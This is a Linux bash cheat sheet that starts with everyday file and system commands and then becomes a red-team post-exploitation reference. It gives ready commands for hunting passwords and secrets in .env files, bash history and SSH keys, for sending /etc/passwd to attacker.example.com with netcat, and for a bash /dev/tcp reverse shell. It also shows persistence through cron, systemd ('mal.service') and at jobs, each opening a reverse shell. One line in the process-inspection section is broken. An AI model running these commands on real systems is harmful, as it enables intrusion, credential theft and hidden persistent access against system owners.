# Linux Bash Reference

## Quick file commands

```bash
# List (human readable), show hidden
ls -lah

# View file contents (pager)
less file.txt
cat file.txt

# Copy / Move / Delete
cp -av source dest
mv -v file dest/
rm -rf ./build/

# Create files/dirs
touch filename.txt
mkdir -p /tmp/mydir
truncate -s 1M placeholder.bin   # create file of size 1MB

# Permissions
chmod 700 script.sh
chown user:group file
getfacl file  # check ACLs

# Archive / compress
tar -cvzf archive.tgz somedir/
unzip package.zip
```

## System & user enumeration

```bash
# Basic system info
uname -a
lsb_release -a  # on many distros
cat /etc/os-release
hostnamectl

# User / groups
id
whoami
getent passwd | grep -E ":/home/"    # list human users
cut -d: -f1,3,6 /etc/passwd
lastlog | head

# Processes / services
ps aux --sort=-%cpu | head -n 20
ss -tunap        # active sockets (recommended)
netstat -tulpn   # if available
systemctl list-units --type=service --state=running
service --status-all

# Network config
ip addr show
ip route show
ip neigh show
route -n

# Mounted filesystems
mount | column -t
lsblk -f
```

## Finding files & secrets

```bash
# Find files by name (recursive)
find / -type f -iname "*password*" 2>/dev/null
find /home -maxdepth 3 -type f -name "*.env" 2>/dev/null

# Search file contents (grep)
grep -RIn --exclude-dir={.git,node_modules} -e "password" -e "secret" /home 2>/dev/null

# Locate database (needs updatedb)
locate .env | head

# Look for common secret locations
ls -lah ~/.ssh
cat ~/.ssh/authorized_keys
cat ~/.bash_history
cat /var/www/html/.env

# Find suid binaries (privilege escalation hunting)
find / -perm -4000 -type f -exec ls -ld {} \; 2>/dev/null

# Find writable files and directories as any user
find / -writable -type d 2>/dev/null | head

# Check sudo rights
sudo -l 2>/dev/null

# Check for credentials in configs
grep -RIn "password\|passwd\|token\|key\|secret" /etc /home 2>/dev/null | head
```

## Networking & transfer

```bash
# Test connectivity
ping -c 4 8.8.8.8
traceroute -n 10.0.0.1

# Download a file
curl -sSL -o /tmp/tool https://example.com/tool && chmod +x /tmp/tool
wget -q -O /tmp/tool https://example.com/tool

# Upload / copy between hosts
scp user@host:/path/to/file ./
rsync -avz user@host:/var/www/ ./www/

# Simple TCP listener (netcat)
# Listener (attacker)
nc -lvnp 9001
# Connect (target)
nc attacker.example.com 9001 < /etc/passwd

# Reverse shell examples (for labs)
# Bash reverse shell (target)
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# Check open ports and services
ss -tunlp
nmap -sC -sV -p- 10.0.0.0/24
```

## Scheduled jobs & persistence

```bash
# List crontab for current user
crontab -l
# System cron jobs
ls -lah /etc/cron.* /etc/crontab

# Create a @reboot cronjob (persistence)
(crontab -l 2>/dev/null; echo "@reboot /usr/bin/nc -e /bin/bash attacker 4444") | crontab -

# Systemd service persistence example (create minimal service)
# /etc/systemd/system/mal.service
# [Unit]
# Description=malicious service
# [Service]
# ExecStart=/usr/bin/bash -lc 'bash -i >/dev/tcp/10.0.0.5/4444 0>&1'
# [Install]
# WantedBy=multi-user.target
sudo systemctl daemon-reload
sudo systemctl enable --now mal.service

# At jobs
echo "/usr/bin/bash -i >/dev/tcp/10.0.0.5/4444 0>&1" | at now + 1 minute
```

## Process & memory inspection

```bash
# View environment of process (requires privileges)
tr '\0' '\n' < /proc/<pid>/environ
' < /proc/<pid>/environ

# Check listening processes and owners
ss -tunlp | grep LISTEN
lsof -i -P -n | grep LISTEN

# Dump process memory (requires privileges)
gcore <pid>    # creates core.<pid>
strings core.<pid> | grep -i password

# Check loaded kernel modules
lsmod
modinfo <module>
```

## Common enumeration utilities (one-liners)

```bash
# Quick list of interesting files, writable locations and cronjobs
(echo "-- Writable dirs --"; find / -type d -writable -print 2>/dev/null | head -n 50; echo "\n-- SUID bins --"; find / -perm -4000 -type f -print 2>/dev/null; echo "\n-- Cronjobs --"; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null) > /tmp/enum_summary.txt

# Check sudo misconfigurations and privileged binaries
sudo -l 2>/dev/null || true
find / -perm -4000 -user root -type f -exec ls -ld {} \; 2>/dev/null | head
```

## Notes

- Redirect errors to /dev/null when you want cleaner output (e.g., permission denied noise).
- Use `ss` instead of `netstat` on modern systems for more accurate socket info.
- Be cautious when fetching and executing remote binaries — only do this in lab environments you control.
- This sheet is a reference for ethical hacking practice and red-team exercises. Keep usage legal and within scope.
